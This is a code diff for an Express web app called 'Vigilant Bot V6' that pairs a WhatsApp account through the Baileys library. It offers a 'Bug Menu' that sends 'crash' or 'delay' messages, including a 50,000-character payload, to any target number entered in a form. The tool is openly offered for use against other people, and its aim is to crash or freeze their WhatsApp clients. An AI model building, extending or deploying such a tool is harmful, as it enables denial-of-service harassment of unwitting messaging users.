@@ -1,163 +1,46 @@
 const express = require('express')
 const { default: makeWASocket, useMultiFileAuthState, Browsers, DisconnectReason } = require('@whiskeysockets/baileys')
 const fs = require('fs')
+const path = require('path')
 
 const app = express()
 app.use(express.urlencoded({ extended: true }))
 app.use(express.json())
 
-let sock
-let pairingCode = ""
-let status = "Waiting for number..."
-let isConnected = false
+const SESSION_PATH = './session'
+let sock, pairingCode = "", status = "Logged out", isConnected = false
 
 async function startBot(number) {
-    const { state, saveCreds } = await useMultiFileAuthState('./session')
-
-    sock = makeWASocket({
-        auth: state,
-        browser: Browsers.ubuntu("Chrome"),
-        printQRInTerminal: false
-    })
-    
+    if(!fs.existsSync(SESSION_PATH)) fs.mkdirSync(SESSION_PATH)
+    const { state, saveCreds } = await useMultiFileAuthState(SESSION_PATH)
+    sock = makeWASocket({ auth: state, browser: Browsers.macOS("Desktop") })
     sock.ev.on('creds.update', saveCreds)
-    
-    sock.ev.on('connection.update', (update) => {
-        const { connection, lastDisconnect } = update
-        if(connection === 'open') {
-            isConnected = true
-            status = "Connected ✅"
-            pairingCode = ""
-            console.log("Bot Connected!")
-        }
-        if(connection === 'close') {
+    sock.ev.on('connection.update', (u) => {
+        if(u.connection === 'open'){ isConnected = true; status = "Connected ✅"; pairingCode = "" }
+        if(u.connection === 'close'){
             isConnected = false
-            const reason = lastDisconnect?.error?.output?.statusCode
-            if(reason !== DisconnectReason.loggedOut) {
-                status = "Disconnected. Click Restart"
-            } else {
-                status = "Logged out. Enter number again"
-                fs.rmSync('./session', { recursive: true, force: true })
-            }
+            if(u.lastDisconnect?.error?.output?.statusCode === DisconnectReason.loggedOut){
+                status = "Logged out"; fs.rmSync(SESSION_PATH, { recursive: true, force: true })
+            } else { status = "Disconnected" }
         }
     })
-    
-    if(!state.creds.registered && number) {
-        await new Promise(resolve => setTimeout(resolve, 3000))
+    if(!state.creds.registered && number){
+        await new Promise(r => setTimeout(r, 3000))
         pairingCode = await sock.requestPairingCode(number)
         status = "Code Generated"
-        console.log("CODE:", pairingCode)
     }
 }
 
-async function disconnectBot() {
-    if(sock) await sock.logout()
-    sock = null
-    isConnected = false
-    status = "Disconnected"
-    pairingCode = ""
-}
-
-// BUG MENU FUNCTION
-async function sendBug(jid, type) {
+async function sendBug(jid, type){
     if(!isConnected) return "Bot not connected"
-    try {
-        if(type === "crash") {
-            await sock.sendMessage(jid, { text: "x".repeat(40000) })
-        }
-        if(type === "delay") {
-            await sock.sendMessage(jid, { text: "".repeat(1000) })
-        }
+    try{
+        await sock.sendMessage(jid, { text: type === "crash" ? "x".repeat(50000) : "".repeat(2000) })
         return "Bug Sent ✅"
-    } catch(e) {
-        return "Failed: " + e.message
-    }
+    }catch(e){ return "Failed: " + e.message }
 }
 
-// WEBSITE
-app.get('/', (req, res) => {
-    res.send(`
-    <html>
-    <head><title>Vigilant Bot V6</title>
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <style>
-        body{font-family:sans-serif;background:#0a0a0a;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
-        .box{background:#1a1a1a;padding:25px;border-radius:12px;text-align:center;width:90%;max-width:400px;border:1px solid #25D366}
-        input,select{padding:10px;width:90%;border:none;border-radius:8px;margin:8px 0;background:#333;color:#fff}
-        button{padding:10px 15px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold}
-        .pair{background:#25D366;color:#000}
-        .restart{background:#ff9800;color:#000}
-        .disconnect{background:#f44336;color:#fff}
-        .bug{background:#9c27b0;color:#fff}
-        .code{font-size:22px;font-weight:bold;color:#25D366;margin:15px 0;letter-spacing:2px}
-        .status{margin:10px 0;font-size:14px;color:#aaa}
-        h2{color:#25D366}
-    </style>
-    </head>
-    <body>
-        <div class="box">
-            <h2>Vigilant Bot V6</h2>
-            
-            <form method="POST" action="/pair">
-                <p><b>Pairing</b></p>
-                <input name="number" placeholder="2348xxxxxxxx" required/>
-                <button type="submit" class="pair">Get Pairing Code</button>
-            </form>
+app.get('/', (req,res) => res.send(`<!DOCTYPE html><html><head><title>Vigilant V6</title><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{background:#f0f2f5;color:#111;font-family:Segoe UI;text-align:center;padding:20px}.box{background:#fff;padding:25px;border-radius:12px;max-width:400px;margin:auto;box-shadow:0 4px 12px rgba(0,0,0,.1);border-top:5px solid #25D366}h2{color:#075E54}input,select{width:90%;padding:12px;margin:8px 0;background:#f0f2f5;border:1px solid #ddd;border-radius:8px}button{padding:12px 20px;margin:5px;border:none;border-radius:8px;cursor:pointer;font-weight:bold;color:#fff}.pair{background:#25D366}.bug{background:#128C7E}.code{font-size:28px;color:#25D366;margin:15px 0;font-weight:bold;letter-spacing:3px}hr{border:none;border-top:1px solid #eee;margin:20px 0}</style></head><body><div class="box"><h2>Vigilant Bot V6 Classic</h2><form method="POST" action="/pair"><h3>Pairing</h3><input name="number" placeholder="2348xxxxxxxx" required><button class="pair">Get Pairing Code</button></form><div class="code">${pairingCode}</div><p>Status: ${status}</p><hr><form method="POST" action="/bug"><h3>Bug Menu</h3><input name="target" placeholder="Target: 2348xxxxxxxx@s.whatsapp.net" required><select name="type"><option value="crash">Crash Bug</option><option value="delay">Delay Bug</option></select><button class="bug">Send Bug</button></form></div></body></html>`))
 
-            <div class="code">${pairingCode ? 'Code: ' + pairingCode : ''}</div>
-            <div class="status">Status: ${status}</div>
-
-            <form method="POST" action="/restart" style="display:inline">
-                <button type="submit" class="restart">Restart</button>
-            </form>
-            <form method="POST" action="/disconnect" style="display:inline">
-                <button type="submit" class="disconnect">Disconnect</button>
-            </form>
-
-            <hr style="margin:20px 0;border-color:#333">
-            
-            <form method="POST" action="/bug">
-                <p><b>Bug Menu</b></p>
-                <input name="target" placeholder="Target: 2348xxxxxxxx@s.whatsapp.net" required/>
-                <select name="type">
-                    <option value="crash">Crash Bug</option>
-                    <option value="delay">Delay Bug</option>
-                </select>
-                <button type="submit" class="bug">Send Bug</button>
-            </form>
-
-            <p style="font-size:12px;margin-top:15px">Pair: WhatsApp > Linked Devices > Link with phone number</p>
-        </div>
-    </body>
-    </html>
-    `)
-})
-
-app.post('/pair', async (req, res) => {
-    const number = req.body.number.replace(/\D/g, '')
-    status = "Generating code..."
-    pairingCode = ""
-    await startBot(number)
-    res.redirect('/')
-})
-
-app.post('/restart', async (req, res) => {
-    await disconnectBot()
-    setTimeout(() => { process.exit(1) }, 1000)
-})
-
-app.post('/disconnect', async (req, res) => {
-    await disconnectBot()
-    res.redirect('/')
-})
-
-app.post('/bug', async (req, res) => {
-    const target = req.body.target
-    const type = req.body.type
-    status = await sendBug(target, type)
-    setTimeout(() => { status = isConnected ? "Connected ✅" : status }, 3000)
-    res.redirect('/')
-})
-
-const PORT = process.env.PORT || 3000
-app.listen(PORT, () => console.log(`Vigilant V6 running on ${PORT}`))
+app.post('/pair', async (req,res) => { const n = req.body.number.replace(/\D/g,''); status="Generating..."; await startBot(n); res.redirect('/') })
+app.post('/bug', async (req,res) => { status=await sendBug(req.body.target, req.body.type); setTimeout(()=>{status=isConnected?"Connected ✅":status},2000); res.redirect('/') })
+app.listen(process.env.PORT||3000)
